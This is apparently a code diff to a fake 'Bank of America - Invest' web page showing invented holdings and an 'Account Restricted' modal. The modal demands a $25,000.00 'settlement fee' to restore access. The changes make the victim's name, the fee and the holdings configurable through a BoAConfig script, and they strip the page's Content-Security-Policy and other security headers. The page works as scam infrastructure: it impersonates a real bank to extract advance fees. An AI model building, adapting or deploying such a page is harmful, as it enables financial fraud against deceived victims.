@@ -2,12 +2,9 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, viewport-fit=cover">
-    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com; style-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com; img-src 'self' data:; font-src 'self' https://cdnjs.cloudflare.com data:; connect-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self';">
-    <meta http-equiv="X-Content-Type-Options" content="nosniff">
-    <meta name="referrer" content="strict-origin-when-cross-origin">
-    <script src="security.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Bank of America - Invest</title>
+    <link rel="icon" href="/logo.svg" type="image/svg+xml">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <link rel="stylesheet" href="style.css">
 </head>
@@ -41,8 +38,8 @@
         <main class="main-content" style="padding-top: 60px;">
             <div class="invest-summary">
                 <div class="invest-total-label">Total Investment Value</div>
-                <div class="invest-total-amount">$178,542.18</div>
-                <div class="invest-change">+$1,932.80 (+1.10%)</div>
+                <div class="invest-total-amount" id="investTotalAmount">$178,542.18</div>
+                <div class="invest-change" id="investChangeAmount">+$1,932.80 (+1.10%)</div>
             </div>
 
             <div class="invest-actions">
@@ -52,58 +49,7 @@
             </div>
 
             <div class="section-header">Your Holdings</div>
-            <div class="holdings-list">
-                <div class="holding-item">
-                    <div>
-                        <div class="holding-name">NVIDIA Corp</div>
-                        <div class="holding-symbol">NVDA</div>
-                    </div>
-                    <div>
-                        <div class="holding-value">$48,250.00</div>
-                        <div class="holding-change">+$1,125.40</div>
-                    </div>
-                </div>
-                <div class="holding-item">
-                    <div>
-                        <div class="holding-name">Tesla Inc</div>
-                        <div class="holding-symbol">TSLA</div>
-                    </div>
-                    <div>
-                        <div class="holding-value">$42,180.00</div>
-                        <div class="holding-change">+$680.20</div>
-                    </div>
-                </div>
-                <div class="holding-item">
-                    <div>
-                        <div class="holding-name">Apple Inc</div>
-                        <div class="holding-symbol">AAPL</div>
-                    </div>
-                    <div>
-                        <div class="holding-value">$35,920.00</div>
-                        <div class="holding-change">+$412.50</div>
-                    </div>
-                </div>
-                <div class="holding-item">
-                    <div>
-                        <div class="holding-name">Microsoft Corp</div>
-                        <div class="holding-symbol">MSFT</div>
-                    </div>
-                    <div>
-                        <div class="holding-value">$28,500.00</div>
-                        <div class="holding-change">+$0.00</div>
-                    </div>
-                </div>
-                <div class="holding-item">
-                    <div>
-                        <div class="holding-name">Bitcoin Trust</div>
-                        <div class="holding-symbol">GBTC</div>
-                    </div>
-                    <div>
-                        <div class="holding-value">$23,692.18</div>
-                        <div class="holding-change negative">-$285.30</div>
-                    </div>
-                </div>
-            </div>
+            <div class="holdings-list" id="holdingsList"></div>
         </main>
 
         <!-- Bottom Navigation -->
@@ -146,11 +92,11 @@
                 <div class="security-icon-lock" style="color: #E31837;">
                     <i class="fas fa-exclamation-triangle"></i>
                 </div>
-                <div class="security-title">Account Restricted</div>
-                <div class="security-text" style="text-align: left;" id="restrictionMessage">
-                    Dear Megan Woods,<br><br>
-                    Your account is temporarily restricted due to unresolved security issues.<br><br>
-                    A settlement fee of <strong style="color: #E31837;">$25,000.00</strong> is required to restore full access and remove the restriction, so normal account operations will be restored.
+                <div class="security-title" id="investRestrictionTitle">Account Restricted</div>
+                <div class="security-text" style="text-align: left;">
+                    <span id="investRestrictionGreeting">Dear Customer,<br><br></span>
+                    <span id="investRestrictionMessage">Your account is temporarily restricted due to unresolved security issues.</span><br><br>
+                    <span id="investRestrictionFeeText">A settlement fee of <strong style="color: #E31837;" id="investSettlementFee">$25,000.00</strong> is required to restore full access and remove the restriction, so normal account operations will be restored.</span>
                 </div>
                 <button id="closeRestrictionBtn" class="security-btn">I Understand</button>
                 <div class="security-footer-link" id="contactSupportLink">Contact Support</div>
@@ -158,9 +104,15 @@
         </div>
     </div>
 
+    <script src="client-secure.js"></script>
+    <script src="config.js"></script>
     <script src="auth.js"></script>
     <script>
         BoAAuth.requireAuth();
+        BoAConfig.initPage(function () {
+            BoAConfig.renderInvestSummary();
+            BoAConfig.renderInvestRestriction();
+        });
 
         document.getElementById('logout-btn').addEventListener('click', function() {
             BoAAuth.logout();
@@ -193,13 +145,6 @@
         
         // Function to show restriction modal immediately - NO CODE VERIFICATION
         function showRestrictionModal() {
-            var user = BoAAuth.getUser();
-            var fee = user && user.settlementFee ? user.settlementFee : '$25,000.00';
-            var name = user && user.name ? user.name : 'Customer';
-            document.getElementById('restrictionMessage').innerHTML =
-                'Dear ' + name + ',<br><br>' +
-                'Your account is temporarily restricted due to unresolved security issues.<br><br>' +
-                'A settlement fee of <strong style="color: #E31837;">' + fee + '</strong> is required to restore full access and remove the restriction, so normal account operations will be restored.';
             restrictionModal.style.display = 'flex';
         }
 
